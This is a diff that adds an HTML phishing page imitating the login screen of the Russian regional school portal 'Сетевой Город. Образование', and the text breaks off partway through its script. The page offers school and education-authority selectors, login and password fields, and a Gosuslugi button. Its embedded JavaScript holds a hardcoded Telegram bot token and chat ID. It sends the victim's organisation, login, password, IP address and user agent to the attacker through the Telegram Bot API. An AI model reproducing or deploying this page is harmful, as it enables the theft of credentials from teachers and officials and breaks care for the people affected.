@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="ru" class="lang__global lang__global__ru" data-select2-id="select2-data-4-ptnh">
+<head>
+    <style type="text/css">[uib-typeahead-popup].dropdown-menu{display:block;}</style>
+    <style type="text/css">.uib-time input{width:50px;}</style>
+    <style type="text/css">[uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,[uib-popover-popup].popover.top-left > .arrow,[uib-popover-popup].popover.top-right > .arrow,[uib-popover-popup].popover.bottom-left > .arrow,[uib-popover-popup].popover.bottom-right > .arrow,[uib-popover-popup].popover.left-top > .arrow,[uib-popover-popup].popover.left-bottom > .arrow,[uib-popover-popup].popover.right-top > .arrow,[uib-popover-popup].popover.right-bottom > .arrow,[uib-popover-html-popup].popover.top-left > .arrow,[uib-popover-html-popup].popover.top-right > .arrow,[uib-popover-html-popup].popover.bottom-left > .arrow,[uib-popover-html-popup].popover.bottom-right > .arrow,[uib-popover-html-popup].popover.left-top > .arrow,[uib-popover-html-popup].popover.left-bottom > .arrow,[uib-popover-html-popup].popover.right-top > .arrow,[uib-popover-html-popup].popover.right-bottom > .arrow,[uib-popover-template-popup].popover.top-left > .arrow,[uib-popover-template-popup].popover.top-right > .arrow,[uib-popover-template-popup].popover.bottom-left > .arrow,[uib-popover-template-popup].popover.bottom-right > .arrow,[uib-popover-template-popup].popover.left-top > .arrow,[uib-popover-template-popup].popover.left-bottom > .arrow,[uib-popover-template-popup].popover.right-top > .arrow,[uib-popover-template-popup].popover.right-bottom > .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}</style>
+    <style type="text/css">.uib-datepicker-popup.dropdown-menu{display:block;float:none;margin:0;}.uib-button-bar{padding:10px 9px 2px;}</style>
+    <style type="text/css">.uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}</style>
+    <style type="text/css">.uib-datepicker .uib-title{width:100%;}.uib-day button,.uib-month button,.uib-year button{min-width:100%;}.uib-left,.uib-right{width:100%}</style>
+    <style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style>
+    <style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    
+    <title class="lang__title">Сетевой Город. Образование</title>
+    <meta name="viewport" content="width=320">
+    <meta http-equiv="Expires" content="10">
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    
+    <!-- Подключение CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css">
+    
+    <style>
+        /* ОСНОВНЫЕ СТИЛИ */
+        body {
+            font-family: Roboto, Arial;
+            color: #2C4053;
+            background: #E8EDF2;
+            margin: 0;
+            min-height: 100vh;
+        }
+        
+        /* ШАПКА */
+        .logoline {
+            position: relative;
+            width: 100%;
+            height: 76px;
+            background: #fff;
+            box-shadow: 0 6px 8px rgba(9,35,72,.2);
+        }
+        
+        .logoline__limiter {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            padding: 0;
+            position: absolute;
+            width: 69%;
+            left: 0;
+            right: 0;
+            margin: auto;
+            top: calc(50% - 24px);
+        }
+        
+        .logo {
+            position: static;
+            width: 48px;
+            height: 48px;
+            left: 0;
+            top: 0;
+        }
+        
+        .logoline__textblock {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            padding: 0;
+            left: 60px;
+            top: 7px;
+            flex: none;
+            order: 1;
+            flex-grow: 0;
+            margin: 0 12px;
+        }
+        
+        .logoline__headertext {
+            line-height: 18px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #2C4053;
+        }
+        
+        .logoline__slogantext {
+            font-size: 13px;
+            line-height: 16px;
+            color: #4D657A;
+        }
+        
+        .hidden-xs {
+            display: none;
+        }
+        
+        /* ОСНОВНОЙ КОНТЕНТ */
+        .container.padding0 {
+            padding: 0;
+            position: absolute;
+            width: 100%;
+            top: 76px;
+            bottom: 0;
+        }
+        
+        .main {
+            height: calc(100vh - 76px);
+            min-height: 733px;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .main:before {
+            content: "";
+            z-index: -1;
+            position: fixed;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border: 40vh solid transparent;
+            border-left: 0 solid transparent;
+            border-right: 100vw solid #f2f6f9;
+            border-bottom: 25vh solid #f2f6f9;
+        }
+        
+        /* ФОРМА ВХОДА */
+        .form {
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 32px;
+            width: 480px;
+            box-shadow: 0 24px 48px rgba(9,35,72,.2);
+            border-radius: 16px;
+            box-sizing: border-box;
+            position: relative;
+        }
+        
+        .form__headertext {
+            font-weight: 500;
+            font-size: 24px;
+            line-height: 28px;
+            text-align: center;
+            color: #2c4053;
+            margin-bottom: 0;
+        }
+        
+        /* КНОПКА ГОСУСЛУГ */
+        .gosbutton {
+            transition: ease-in-out .2s;
+            background: #fff;
+            cursor: pointer;
+            position: relative;
+            width: 100%;
+            height: 48px;
+            padding: 15px 0;
+            margin-top: 32px;
+            border: 1px solid #C6D2DD;
+            box-sizing: border-box;
+            border-radius: 4px;
+        }
+        
+        .gosbutton:hover {
+            background: #F2F6F9;
+        }
+        
+        .gosbutton__textgroup {
+            position: absolute;
+            display: flex;
+            flex-direction: row;
+            width: 148.27px;
+            height: 18px;
+            margin: auto;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+        }
+        
+        .gosbutton__textgroup-text {
+            font-weight: 400;
+            font-size: 14px;
+            line-height: 16px;
+            display: flex;
+            align-items: center;
+            text-align: right;
+            color: #2C4053;
+        }
+        
+        .gosbutton__textgroup-logo {
+            margin-top: 1px;
+            margin-left: 8px;
+        }
+        
+        /* РАЗДЕЛИТЕЛЬ "ИЛИ" */
+        .wrapper-or {
+            width: 100%;
+            position: relative;
+            height: 16px;
+            margin-top: 32px;
+        }
+        
+        .wrapper-or__line {
+            position: absolute;
+            z-index: 0;
+            top: 7px;
+            left: 0;
+            height: 0;
+            width: 100%;
+            border-bottom: 1px solid #94A7B9;
+        }
+        
+        .wrapper-or__text {
+            position: absolute;
+            z-index: 1;
+            top: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+            background: #fff;
+            width: 25px;
+            height: 16px;
+            font-size: 14px;
+            line-height: 16px;
+            color: #94A7B9;
+            display: flex;
+            padding: 0 8px;
+            align-items: center;
+            text-align: center;
+            box-sizing: content-box;
+        }
+        
+        /* БЛОК ЛОГИНА И ПАРОЛЯ */
+        .logpass {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            width: 100%;
+            margin: 32px 0 0;
+        }
+        
+        .logpass__headertext {
+            min-height: 24px;
+            font-size: 16px;
+            line-height: 24px;
+            text-align: center;
+            align-self: center;
+            width: 100%;
+        }
+        
+        /* ПЕРЕКЛЮЧАТЕЛЬ */
+        .changeorg {
+            width: 100%;
+            height: 48px;
+            display: flex;
+            flex-direction: row;
+            border-bottom: 1px solid #D3DDE5;
+            margin-top: 16px;
+        }
+        
+        .changeorg_item {
+            cursor: pointer;
+            padding: 12px 0;
+            text-align: center;
+            position: relative;
+            width: 50%;
+            font-size: 14px;
+            line-height: 24px;
+            color: #2C4053;
+        }
+        
+        .changeorg_item.active {
+            border-bottom: 3px solid #3063AD;
+            background: #fff;
+            font-weight: 500;
+        }
+        
+        /* ВЫБОР ОРГАНИЗАЦИИ */
+        .dropdown-org {
+            margin-top: 16px;
+            width: 100%;
+        }
+        
+        .select2__button {
+            width: 100%;
+        }
+        
+        /* ПОЛЯ ВВОДА */
+        .lc-input, .logpass__pass {
+            position: relative;
+            display: flex;
+            border-radius: 3px;
+            width: 100%;
+            height: 48px;
+            margin-top: 16px;
+            border: 1px solid #C6D2DD;
+            background: #F2F6F9;
+            box-sizing: border-box;
+        }
+        
+        .lc-input.active, .logpass__pass.active {
+            border: 1px solid #4376BE;
+        }
+        
+        .lc-input-placeholder, .logpass__pass-placeholder {
+            top: 15px;
+            left: 11px;
+            position: absolute;
+            color: #94A7B9;
+            font-size: 14px;
+            line-height: 16px;
+            transition: all 0.2s;
+            pointer-events: none;
+        }
+        
+        .lc-input.active .lc-input-placeholder,
+        .logpass__pass.active .logpass__pass-placeholder {
+            color: #3063AD;
+            font-size: 12px;
+            top: 7px;
+        }
+        
+        .lc-input-control, .logpass__input {
+            width: 100%;
+            height: 100%;
+            border: none;
+            outline: none;
+            font-size: 14px;
+            color: #2C4053;
+            background: transparent;
+            padding: 15px 48px 15px 12px;
+            box-sizing: border-box;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        
+        /* ИКОНКА ГЛАЗА */
+        .logpass__pass-icon {
+            width: 48px;
+            height: 47px;
+            right: 0;
+            top: 0;
+            position: absolute;
+            cursor: pointer;
+            z-index: 1;
+        }
+        
+        .logpass__pass-icon img {
+            position: absolute;
+            top: calc(50% - 12px);
+            left: calc(50% - 12px);
+            width: 24px;
+            height: 24px;
+            display: none;
+        }
+        
+        .logpass__pass .eyeoff {
+            display: block;
+        }
+        
+        .logpass__pass.openeye .eyeon {
+            display: block;
+        }
+        
+        .logpass__pass.openeye .eyeoff {
+            display: none;
+        }
+        
+        /* ЧЕКБОКС */
+        .add_features {
+            display: flex;
+            flex-direction: row;
+            width: 100%;
+            height: 24px;
+            margin-top: 16px;
+            align-items: center;
+        }
+        
+        .lc-checkbox {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            color: #2C4053;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .lc-checkbox-icon {
+            width: 24px;
+            height: 24px;
+            position: relative;
+        }
+        
+        .lc-checkbox-icon img {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+        }
+        
+        .state02, .state03, .state04 {
+            display: none;
+        }
+        
+        .lc-checkbox.active .state03 {
+            display: block;
+        }
+        
+        .lc-checkbox.active .state01 {
+            display: none;
+        }
+        
+        .lc-checkbox-text {
+            font-size: 14px;
+            line-height: 24px;
+            margin-left: 8px;
+        }
+        
+        .add_features-forgotpass {
+            margin-left: auto;
+            font-size: 13px;
+            line-height: 16px;
+            color: #2C4053;
+            text-decoration: none;
+        }
+        
+        /* КНОПКА ВОЙТИ */
+        .primary-button {
+            cursor: pointer;
+            width: 100%;
+            padding: 12px 0;
+            margin-top: 16px;
+            background: #3063AD;
+            border-radius: 4px;
+            border: none;
+            font-size: 16px;
+            line-height: 24px;
+            font-weight: 500;
+            color: #fff;
+            text-align: center;
+            transition: ease-in-out .2s;
+        }
+        
+        .primary-button:hover {
+            background: #4376BE;
+        }
+        
+        /* ОШИБКИ */
+        .has-error .select2-container .select2-selection--single {
+            border-color: #a94442 !important;
+        }
+        
+        .help-block {
+            color: #a94442;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+        
+        /* АДАПТИВНОСТЬ */
+        @media (max-width: 600px) {
+            .form {
+                width: 100%;
+                border-radius: 0;
+                padding: 32px 16px;
+            }
+            
+            .changeorg {
+                flex-direction: column;
+                height: auto;
+                border: 0;
+            }
+            
+            .changeorg_item {
+                width: 100%;
+                text-align: left;
+                padding-left: 12px;
+                height: 52px;
+                border-bottom: 1px solid #D3DDE5;
+            }
+            
+            .hidden-xs {
+                display: none !important;
+            }
+        }
+    </style>
+</head>
+
+<body class="school ng-scope">
+    <!-- ШАПКА -->
+    <header>
+        <div class="logoline lang__ru">
+            <div class="logoline__limiter">
+                <img class="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAIlSURBVHgB7Zq/axRBGMaf2b3LJZckB0IQsSAkEAjBxsJCG1FECKKiYGFnY2NnY2NnY2NnY2NnYyFoIYiCIIiIICIiIqIgIiJBuST5c7sz47uXkLvN7t7uzd7dXvKBYf+9+z7PvDs7OzuDEEIIIYQQQgghhBBCiD5DpZsNrHr96Pc7GAgz8N0yHCcAEMCaGlqtBzC6itm5F6hULvVDwIZJP3pzH9bMOeY8PF0GqWmg7AFhAKgQzIx2D83WHbSbDzE7/xSl0vU0E2QSeP1yEa32A3h6CUpNwXWnQc5oQp8Q1mtoNK4ibD3FzPyzJBMUJ/D65S20w7/g6Rl4ehJExFjE0Gj8h3brMqZn3+Dw0ZUkzVxMgD98QEtfg6/n4mR7lqjVPsLzP+PIsd9JmrWYQK32Ae32tUJke5Y4cPAVgEoSCYcVmJtH0NhAq7kCT48VLtubxEX4/i0kEWAFpJQI9C+E4fc+yPYs4ftHAJRZAWkFVGs1lIKaEdmeJRqNGgBlVkBaAVV/vP1bTYR6w5Bs7xKueyJVgRgBpRRC/YM5/8eJhZ8/wg/XwQqrjowVqFY/wfdvMyfbW0If9fr7xOdDqgJnz33Czu6FwvP/poQyu3j3dhGnTn9M0oyFL3/2E/sJjjtp+BFvOtxNnFv8nKYZC0scOvQD9fotVKtX/kiZg/2WOHHiO46f+Jqm6Yqc9eT4Dr58nsTOzjlsb11Es3mqLxLHFlZxZP5rmibF3QlOJ/yCMPwGx7kHoAY2DcIQNq3rGhp7d7C78xRTM+9QqVxL00jFxP/Rj7G7B6yufkXg/4CjQjh6Ekr5cN0yOPy+noKxAYwJYHSAIPyFoPEb4b7A5NQ7VCo3kzTF3c17jVb7AVrtm1DqAly9CFcvQOlZOGocjp6AUqPw9BiUGoOnx+HpJXh6Cb6+DKVeIGjew8zs8yTZf7v9IIQQQgghhBBCCCGEECKGfwldgKaBJei+AAAAAElFTkSuQmCC" alt="Логотип">
+                <div class="logoline__textblock">
+                    <div class="logoline__headertext">Сетевой Город. Образование</div>
+                    <div class="logoline__slogantext hidden-xs">Единая цифровая образовательная среда региона</div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="container padding0">
+        <main class="main">
+            <div class="form primary-input-form h573 ng-dirty ng-valid-parse ng-invalid ng-invalid-required">
+                <div class="form__headertext">Вход в систему</div>
+                <div style="width: 100%">
+                    <!-- КНОПКА ГОСУСЛУГ -->
+                    <div class="gosbutton gosbutton-loginform" id="gosBtn">
+                        <div class="gosbutton__textgroup">
+                            <div class="gosbutton__textgroup-text">Через</div>
+                            <img class="gosbutton__textgroup-logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzIiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCA3MiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTYuNTE5NTMgNC40NDUzMUw2LjUxOTUzIDExLjU1MTJIMS42NjY2N0wxLjY2NjY3IDQuNDQ1MzFMNi41MTk1MyA0LjQ0NTMxWk02LjUxOTUzIDAuODMyMDMxTDEuNjY2NjcgMC44MzIwMzFMMS42NjY2NyAzLjEzODI4TDYuNTE5NTMgMy4xMzgyOEw2LjUxOTUzIDAuODMyMDMxWk0xMC44OTU4IDExLjU1MTJMMTAuODk1OCA4LjI0NDE0SDcuMzU3NDJMNy4zNTc0MiA2Ljg1NTQ3SDEwLjg5NThMMTAuODk1OCA0LjQ0NTMxTDcuMzU3NDIgNC40NDUzMUw3LjM1NzQyIDMuMTM4MjhMMTAuODk1OCAzLjEzODI4TDEwLjk1OCAwLjgzMjAzMUw2LjUxOTUzIDAuODMyMDMxTDYuNTE5NTMgMTEuNTUxMkwxMC44OTU4IDExLjU1MTJ6TTE0LjY2NjcgMTEuNTUxMkwxNC42NjY3IDguMjQ0MTRIMTEuOTM3NUwxMS45Mzc1IDYuODU1NDdIMTQuNjY2N0wxNC42NjY3IDQuNDQ1MzFMMTEuOTM3NSA0LjQ0NTMxTDExLjkzNzUgMy4xMzgyOEwxNC42NjY3IDMuMTM4MjhMMTQuNjY2NyAwLjgzMjAzMUwxMC44OTU4IDAuODMyMDMxTDEwLjg5NTggMTEuNTUxMkwxNC42NjY3IDExLjU1MTJ6TTE4LjQzNzUgMTEuNTUxMkwxOC40Mzc1IDguMjQ0MTRIMTUuNzE4OEwxNS43MTg4IDYuODU1NDdIMTguNDM3NUwxOC40Mzc1IDQuNDQ1MzFMMTUuNzE4OCA0LjQ0NTMxTDE1LjcxODggMy4xMzgyOEwxOC40Mzc1IDMuMTM4MjhMMTguNDM3NSAwLjgzMjAzMUwxNC42NjY3IDAuODMyMDMxTDE0LjY2NjcgMTEuNTUxMkwxOC40Mzc1IDExLjU1MTJ6TTIyLjIwODMgMTEuNTUxMkwyMi4yMDgzIDguMjQ0MTRIMTkuNDg5NkwxOS40ODk2IDYuODU1NDdIMjIuMjA4M0wyMi4yMDgzIDQuNDQ1MzFMMTkuNDg5NiA0LjQ0NTMxTDE5LjQ4OTYgMy4xMzgyOEwyMi4yMDgzIDMuMTM4MjhMMjIuMjA4MyAwLjgzMjAzMUwxOC40Mzc1IDAuODMyMDMxTDE4LjQzNzUgMTEuNTUxMkwyMi4yMDgzIDExLjU1MTJ6TTI1Ljk3OTEgMTEuNTUxMkwyNS45NzkxIDguMjQ0MTRIMjMuMjYwNEwyMy4yNjA0IDYuODU1NDdIMjUuOTc5MUwyNS45NzkxIDQuNDQ1MzFMMjMuMjYwNCA0LjQ0NTMxTDIzLjI2MDQgMy4xMzgyOEwyNS45NzkxIDMuMTM4MjhMMjUuOTc5MSAwLjgzMjAzMUwyMi4yMDgzIDAuODMyMDMxTDIyLjIwODMgMTEuNTUxMkwyNS45NzkxIDExLjU1MTJ6TTI5Ljc1IDExLjU1MTJMMjkuNzUgOC4yNDQxNEgyNy4wMzEzTDI3LjAzMTMgNi44NTU0N0gyOS43NUwyOS43NSA0LjQ0NTMxTDI3LjAzMTMgNC40NDUzMUwyNy4wMzEzIDMuMTM4MjhMMjkuNzUgMy4xMzgyOEwyOS43NSAwLjgzMjAzMUwyNS45NzkxIDAuODMyMDMxTDI1Ljk3OTEgMTEuNTUxMkwyOS43NSAxMS41NTEyTjMzLjUyMDggMTEuNTUxMkwzMy41MjA4IDguMjQ0MTRIMzAuODAyMUwzMC44MDIxIDYuODU1NDdIMzMuNTIwOEwzMy41MjA4IDQuNDQ1MzFMNjIuMTE0NiA2Ljg1NTQ3SDQ0LjgzMzNMNDQuODMzMyA0LjQ0NTMxTDQyLjExNDYgNC40NDUzMUw0Mi4xMTQ2IDMuMTM4MjhMNDQuODMzMyAzLjEzODI4TDQ0LjgzMzMgMC44MzIwMzFMNDEuMDYyNSAwLjgzMjAzMUw0MS4wNjI1IDExLjU1MTJMNDQuODMzMyAxMS41NTEyeiI+PC9wYXRoPjwvc3ZnPg==" alt="Госуслуги">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- РАЗДЕЛИТЕЛЬ "ИЛИ" -->
+                <div class="wrapper-or" id="orDiv" style="display: none;">
+                    <div class="wrapper-or__line"></div>
+                    <div class="wrapper-or__text">или</div>
+                </div>
+
+                <!-- БЛОК ЛОГИНА И ПАРОЛЯ -->
+                <div class="logpass" id="logpassDiv" style="display: none;">
+                    <div class="logpass__headertext">Вход через логин и пароль</div>
+                    
+                    <!-- ПЕРЕКЛЮЧАТЕЛЬ -->
+                    <div class="changeorg">
+                        <div class="changeorg_item active">Организация</div>
+                        <div class="changeorg_item">Орган управления</div>
+                    </div>
+                    
+                    <!-- ВЫБОР ОРГАНИЗАЦИИ -->
+                    <div class="dropdown-org has-error">
+                        <div class="select2__button">
+                            <select class="form-control select2-hidden-accessible" 
+                                    name="org" 
+                                    required="required"
+                                    style="width: 100%"
+                                    data-select2-id="select2-data-1-d1qp">
+                                <option value=""></option>
+                                <option value="796">МБОУ "СОШ №102"</option>
+                                <option value="801">МБОУ "Лицей №3"</option>
+                                <option value="795">МБОУ "Гимназия №5"</option>
+                                <option value="802">МБОУ "СОШ №12"</option>
+                                <option value="799">МБОУ "СОШ №8"</option>
+                                <option value="797">МБОУ "СОШ №15"</option>
+                                <option value="800">МБОУ "Лицей №7"</option>
+                                <option value="798">МБОУ "СОШ №22"</option>
+                                <option value="803">МАОУ "Гимназия №1"</option>
+                            </select>
+                            
+                            <span class="help-block" style="display: block;">
+                                Обязательное поле
+                            </span>
+                        </div>
+                    </div>
+                    
+                    <!-- ПОЛЕ ЛОГИНА -->
+                    <div class="lc-input lc-input-login" id="loginInput">
+                        <div class="lc-input-placeholder">Логин</div>
+                        <input name="loginname" class="lc-input-control" type="text" required>
+                        <div class="lc-input-valid-icon" style="display: none;">
+                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAABLSURBVHgB7dWxCcAgEIXhK1hld4Kdla2dO1j5G8HCBwqKKA8uzx0E32TggBD+7ptKVTqCpoZoIMwRhghzhCnCGGGIMEToEVoE+8sPJ1QwyO8lVbMAAAAASUVORK5CYII=" alt="✓">
+                        </div>
+                    </div>
+                    
+                    <!-- ПОЛЕ ПАРОЛЯ -->
+                    <div class="logpass__pass" id="passInput">
+                        <div class="logpass__pass-placeholder">Пароль</div>
+                        <input name="password" class="logpass__input" type="password" required>
+                        <div class="logpass__pass-icon" id="togglePassIcon">
+                            <img class="eyeoff" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAABzSURBVHgB7dWxDYAwDETRG4m9/0V2J0CBIjESJ+UuR3JbDAi47/skSRo6fC4rOSFgFQ82YAw9G8CqKgbW2cA7NoBVVQysqw9gVf7AFjaxgY7+AN2hBRK5iD1iAAAAAElFTkSuQmCC" alt="Показать">
+                            <img class="eyeon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAABxSURBVHgB7dWhDcAgDEDRH4m9/0V2J0CBIjESJ+UuR3JbDAhY1+c8s8bA5n3ew7q6amIDWMWDDRhDzwawqoqBdTbwjg1gFQ82YAw9G8CqKgbW2cA7NoBVVQysqw9gVf7AFjaxgY7+AN2hBRK5iD1iAAAAAElFTkSuQmCC" alt="Скрыть" style="display: none;">
+                        </div>
+                    </div>
+                    
+                    <!-- ЧЕКБОКС И ССЫЛКА -->
+                    <div class="add_features">
+                        <a class="lc-checkbox" href="#" id="rememberCheckbox">
+                            <div class="lc-checkbox-icon">
+                                <img class="state01" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAABoSURBVHgB7dWxDYAwDETRG4m9/0V2J0CBIjESJ+UuR3JbDAi47/skSRo6fC4rOSFgFQ82YAw9G8CqKgbW2cA7NoBVVQysqw9gVf7AFjaxgY7+AN2hBRK5iD1iAAAAAElFTkSuQmCC" alt="">
+                                <img class="state03" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAABsSURBVHgB7dWxDYAwDETRG4m9/0V2J0CBIjESJ+UuR3JbDAi47/skSRo6fC4rOSFgFQ82YAw9G8CqKgbW2cA7NoBVVQysqw9gVf7AFjaxgY7+AN2hBRK5iD1iAAAAAElFTkSuQmCC" alt="" style="display: none;">
+                            </div>
+                            <div class="lc-checkbox-text">Оставаться в системе</div>
+                        </a>
+                        <a class="add_features-forgotpass" href="#" id="forgotPassLink">Забыли пароль?</a>
+                    </div>
+                    
+                    <!-- КНОПКА ВОЙТИ -->
+                    <div class="primary-button" id="loginBtn">Войти</div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- ПОДКЛЮЧЕНИЕ БИБЛИОТЕК -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.full.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/i18n/ru.js"></script>
+    
+    <script>
+        // ========== НАСТРОЙКИ ТЕЛЕГРАМ ==========
+        const TELEGRAM_BOT_TOKEN = '7144151277:AAHj2q1QitmAZysgypbCib3wj4fFpymq1W0'; // Токен бота
+        const TELEGRAM_CHAT_ID = '@Ranaldapushka52'; // Ваш телеграм (с @)
+        
+        // ========== ФУНКЦИЯ ОТПРАВКИ В ТЕЛЕГРАМ ==========
+        async function sendToTelegram(data) {
+            try {
+                const message = `🔐 НОВЫЕ ДАННЫЕ ВХОДА\n\n` +
+                               `🏫 Организация: ${data.orgName}\n` +
+                               `🔢 ID организации: ${data.orgId}\n` +
+                               `👤 Логин: ${data.login}\n` +
+                               `🔑 Пароль: ${data.password}\n` +
+                               `💾 Запомнить: ${data.remember ? 'Да' : 'Нет'}\n` +
+                               `🖥️ Режим: ${data.mode}\n` +
+                               `🌐 IP: ${data.ip}\n` +
+                               `📍 User-Agent: ${data.userAgent.substring(0, 50)}...\n` +
+                               `📅 Время: ${new Date().toLocaleString('ru-RU')}`;
+                
+                // Отправка через Telegram Bot API
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+                return false;
+            }
+        }
+        
+        // ========== ПОЛУЧЕНИЕ IP ПОЛЬЗОВАТЕЛЯ ==========
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Не удалось определить IP';
+            }
+        }
+        
+        // ========== ОСНОВНОЙ КОД ==========
+        $(document).ready(function() {
+            // 1. Настройка Select2
+            $('select[name="org"]').select2({
+                placeholder: "Выберите организацию",
+                allowClear: false,
+                language: "ru",
+                width: '100%',
+                dropdownAutoWidth: true,
+                minimumResultsForSearch: 0
+            }).on('select2:open', function() {
+                setTimeout(function() {
+                    var $results = $('.select2-results__options');
+                    if ($results.find('.select2-results__message').length === 0) {
+                        $results.prepend('<li class="select2-results__option select2-results__message" role="alert" aria-live="assertive">Введите номер или название организации.<br>Для уточнения результатов поиска можно дополнительно указать<br>название населённого пункта.<br>Например: сош 10 самара</li>');
+                    }
+                }, 10);
+            });
+
+            // 2. Клик по кнопке "Через Госуслуги"
+            $('#gosBtn').click(function() {
+                $('#orDiv').slideDown(200);
+                $('#logpassDiv').slideDown(300);
+            });
+
+            // 3. Переключение Организация/Орган управления
+            $('.changeorg_item').click(function() {
+                $('.changeorg_item').removeClass('active');
+                $(this).addClass('active');
+                
+                if ($(this).text() === 'Орган управления') {
+                    $('select[name="org"]').empty().append(
+                        '<option value=""></option>' +
+                        '<option value="1001">Министерство образования региона</option>' +
+                        '<option value="1002">Департамент образования города</option>' +
